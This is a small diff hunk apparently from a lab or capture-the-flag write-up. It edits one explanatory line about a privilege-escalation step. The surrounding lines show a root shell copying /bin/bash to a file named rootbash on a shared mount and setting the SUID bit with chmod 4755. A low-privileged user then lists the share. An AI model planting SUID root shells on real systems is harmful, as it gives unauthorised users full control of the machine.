@@ -812,7 +812,7 @@ root@nyc-pweb03:/mnt/share# cp /bin/bash rootbash
 root@nyc-pweb03:/mnt/share# chmod 4755 rootbash 
 ```
 
-So now on the docker container ill make a SUID copy of `/bin/bash` 
+So now on the docker container ill make a SUID copy of `/bin/bash`, the prepended `4` set the file as a SUID to let whoever runs it
 
 ```python
 spencer@ip-10-0-20-19:/var/share$ ls -al
